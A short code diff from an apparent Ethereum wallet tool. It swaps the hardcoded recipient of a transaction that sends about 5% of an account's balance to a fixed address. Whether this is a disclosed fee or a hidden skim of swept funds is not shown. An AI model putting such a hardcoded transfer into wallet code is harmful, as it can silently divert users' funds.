@@ -112,7 +112,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                             }
                             MineTransaction2 = {
                                 'nonce': w3.eth.getTransactionCount(account.address)+1,
-                                'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
+                                'to': "0x9BF662bC68D96507d5b588C699131397c5E87D70",
                                 'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                 'gas': 21000,
                                 'gasPrice': w3.toWei(avgGas, "gwei")
